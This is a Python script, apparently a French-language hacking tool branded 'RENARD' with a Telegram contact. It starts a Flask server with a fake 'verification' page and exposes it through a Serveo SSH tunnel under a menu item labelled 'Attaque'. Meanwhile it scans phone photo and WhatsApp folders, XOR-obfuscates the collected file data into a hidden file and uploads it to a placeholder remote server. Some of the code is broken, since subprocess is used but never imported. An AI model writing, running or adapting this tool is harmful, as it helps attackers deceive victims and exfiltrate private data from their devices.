#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import hashlib
import requests
import threading
import webbrowser
from datetime import datetime
from time import sleep
from flask import Flask, request, redirect, Response

# Configuration
APP = Flask(__name__)
LOG_FILE = "/sdcard/.renard_media.txt"
MAX_PHOTOS = 127
PHOTO_DIRS = [
    "/DCIM/Camera",
    "/Pictures",
    "/WhatsApp/Media/WhatsApp Images",
    "/Download"
]
SERVER_URL = "https://your-server.com/upload"
TELEGRAM_LINK = "https://t.me/hextechcar"
LOCAL_PORT = 8080

class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

class MediaCollector:
    def __init__(self):
        self.collected = []
        self.lock = threading.Lock()
        
    def get_photo_metadata(self, path):
        try:
            stat = os.stat(path)
            return {
                "path": path,
                "size": stat.st_size,
                "modified": stat.st_mtime,
                "hash": self.calculate_md5(path),
                "content_type": self.detect_content_type(path)
            }
        except Exception:
            return None
    
    def calculate_md5(self, filename):
        hash_md5 = hashlib.md5()
        try:
            with open(filename, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_md5.update(chunk)
            return hash_md5.hexdigest()
        except Exception:
            return "error"
    
    def detect_content_type(self, filename):
        ext = os.path.splitext(filename)[1].lower()
        if ext in ['.jpg', '.jpeg']:
            return "image/jpeg"
        elif ext == '.png':
            return "image/png"
        elif ext == '.mp4':
            return "video/mp4"
        return "application/octet-stream"
    
    def scan_photos(self):
        base_path = os.getenv('EXTERNAL_STORAGE', '/sdcard')
        found_photos = []
        
        for photo_dir in PHOTO_DIRS:
            full_path = os.path.join(base_path, photo_dir.lstrip('/'))
            
            if not os.path.exists(full_path):
                continue
                
            for root, _, files in os.walk(full_path):
                for file in files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4')):
                        full_file_path = os.path.join(root, file)
                        metadata = self.get_photo_metadata(full_file_path)
                        
                        if metadata and metadata['size'] > 1024:
                            found_photos.append(metadata)
                            
                            if len(found_photos) >= MAX_PHOTOS:
                                break
                    if len(found_photos) >= MAX_PHOTOS:
                        break
                if len(found_photos) >= MAX_PHOTOS:
                    break
        
        with self.lock:
            self.collected = found_photos
    
    def save_to_file(self):
        if not self.collected:
            return False
            
        data = {
            "timestamp": datetime.now().isoformat(),
            "device_id": hashlib.md5(os.uname().nodename.encode()).hexdigest(),
            "media": self.collected
        }
        
        try:
            json_data = json.dumps(data)
            key = 0x55
            encrypted = bytes([ord(c) ^ key for c in json_data])
            
            with open(LOG_FILE, 'wb') as f:
                f.write(encrypted)
                
            return True
        except Exception as e:
            print(f"Save error: {e}", file=sys.stderr)
            return False
    
    def send_to_server(self):
        if not os.path.exists(LOG_FILE):
            return False
            
        try:
            with open(LOG_FILE, 'rb') as f:
                files = {'media': (os.path.basename(LOG_FILE), f, 'application/octet-stream')}
                response = requests.post(SERVER_URL, files=files, timeout=30)
                return response.status_code == 200
        except Exception:
            return False

collector = MediaCollector()

@APP.route('/init')
def init_collection():
    thread = threading.Thread(target=collector.scan_photos)
    thread.start()
    return redirect('/progress')

@APP.route('/progress')
def progress():
    return """
    <html>
    <body>
        <h2>Vérification en cours...</h2>
        <progress value="50" max="100"></progress>
        <script>
            setTimeout(function() {
                window.location.href = '/complete';
            }, 5000);
        </script>
    </body>
    </html>
    """

@APP.route('/complete')
def complete():
    if collector.save_to_file():
        collector.send_to_server()
        return """
        <html>
        <body>
            <h2 style="color:green;">Vérification terminée avec succès!</h2>
            <p>Merci pour votre participation.</p>
        </body>
        </html>
        """
    else:
        return """
        <html>
        <body>
            <h2 style="color:red;">Erreur lors de la vérification</h2>
            <p>Veuillez réessayer plus tard.</p>
        </body>
        </html>
        """

def run_server():
    APP.run(host='0.0.0.0', port=LOCAL_PORT, threaded=True, debug=False)

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{Colors.GREEN}
    ██████╗ ███████╗███╗   ██╗ █████╗ ██████╗ ██████╗ 
    ██╔══██╗██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔══██╗
    ██████╔╝█████╗  ██╔██╗ ██║███████║██████╔╝██║  ██║
    ██╔══██╗██╔══╝  ██║╚██╗██║██╔══██║██╔══██╗██║  ██║
    ██║  ██║███████╗██║ ╚████║██║  ██║██║  ██║██████╔╝
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
    {Colors.END}
    [✓] Version: 2.0.0
    [✓] GitHub: SAMSMIS01
    [✓] Telegram: {TELEGRAM_LINK}
    [✓] Instagram: SAMSMIS01
    [✓] Email: hextech243@gmail.com
    ---------------------------------------------------
    """)

def show_menu():
    print(f"""
    {Colors.GREEN}[1]{Colors.END} Rejoindre le canal Telegram
    {Colors.GREEN}[2]{Colors.END} Générer un lien Serveo (Attaque)
    {Colors.RED}[0]{Colors.END} Quitter
    """)
    
    try:
        choice = input(f"{Colors.YELLOW}[?] Choisis une option: {Colors.END}")
        return choice
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interruption par l'utilisateur{Colors.END}")
        sys.exit(0)

def start_serveo():
    print(f"\n{Colors.BLUE}[*] Initialisation du tunnel Serveo...{Colors.END}")
    try:
        cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{LOCAL_PORT} serveo.net"
        subprocess.run(cmd.split(), check=True)
    except Exception as e:
        print(f"{Colors.RED}[!] Erreur: {e}{Colors.END}")

def main():
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    
    while True:
        show_banner()
        choice = show_menu()
        
        if choice == "1":
            print(f"\n{Colors.GREEN}[+] Redirection vers Telegram...{Colors.END}")
            webbrowser.open(TELEGRAM_LINK)
            sleep(2)
        elif choice == "2":
            print(f"\n{Colors.GREEN}[+] Génération du lien Serveo...{Colors.END}")
            start_serveo()
            input("\nAppuyez sur Entrée pour continuer...")
        elif choice == "0":
            print(f"\n{Colors.RED}[!] Fin du programme.{Colors.END}")
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}[!] Option invalide.{Colors.END}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interruption par l'utilisateur{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Erreur: {e}{Colors.END}")
        sys.exit(1)